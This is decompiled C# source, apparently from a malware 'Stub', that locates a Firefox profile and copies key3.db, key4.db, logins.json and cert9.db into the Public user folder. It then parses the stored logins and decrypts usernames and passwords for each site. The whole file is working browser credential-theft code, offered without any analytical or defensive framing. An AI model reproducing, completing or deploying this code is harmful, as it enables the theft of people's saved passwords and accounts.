using System;
using System.Collections.Generic;
using System.IO;

namespace Stub
{
	// Token: 0x0200000F RID: 15
	public class Class18
	{
		// Token: 0x06000023 RID: 35 RVA: 0x00002EE8 File Offset: 0x000010E8
		public static string smethod_0(string String_3)
		{
			string name = new DirectoryInfo(String_3).Name;
			string text = Path.Combine(Class18.String_1, name);
			if (!Directory.Exists(text))
			{
				Directory.CreateDirectory(text);
			}
			foreach (string path in Class18.String_2)
			{
				try
				{
					string text2 = Path.Combine(String_3, path);
					if (File.Exists(text2))
					{
						File.Copy(text2, Path.Combine(text, Path.GetFileName(text2)));
					}
				}
				catch (Exception value)
				{
					Console.WriteLine(value);
					return null;
				}
			}
			return Path.Combine(Class18.String_1, name);
		}

		// Token: 0x06000024 RID: 36 RVA: 0x00002F88 File Offset: 0x00001188
		public static List<GStruct5> smethod_1(string String_3)
		{
			List<GStruct5> list = new List<GStruct5>();
			string text = Class26.smethod_2(String_3);
			if (text == null)
			{
				return list;
			}
			string text2 = Class26.smethod_3();
			if (text2 == null)
			{
				return list;
			}
			string text3 = Class18.smethod_0(text);
			if (text3 == null)
			{
				return list;
			}
			Class24 @class = new Class24(File.ReadAllText(Path.Combine(text3, "logins.json")));
			@class.method_1(new string[]
			{
				",\"logins\":\\[",
				",\"potentiallyVulnerablePasswords\""
			});
			string[] array = @class.method_2("},");
			if (GClass4.smethod_0(text2))
			{
				if (!GClass4.smethod_2(text3))
				{
					Console.WriteLine("Failed to set profile!");
				}
				foreach (string string_ in array)
				{
					GStruct5 item = default(GStruct5);
					Class24 class2 = new Class24(string_);
					string string_2 = class2.method_0("hostname");
					string string_3 = class2.method_0("encryptedUsername");
					string text4 = class2.method_0("encryptedPassword");
					if (!string.IsNullOrEmpty(text4))
					{
						item.String_0 = string_2;
						item.String_1 = GClass4.smethod_3(string_3);
						item.String_2 = GClass4.smethod_3(text4);
						list.Add(item);
					}
				}
				GClass4.smethod_1();
			}
			Directory.Delete(text3, true);
			return list;
		}

		// Token: 0x04000005 RID: 5
		public static string String_0 = Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System));

		// Token: 0x04000006 RID: 6
		public static string String_1 = Path.Combine(Class18.String_0, "Users\\Public");

		// Token: 0x04000007 RID: 7
		public static string[] String_2 = new string[]
		{
			"key3.db",
			"key4.db",
			"logins.json",
			"cert9.db"
		};
	}
}
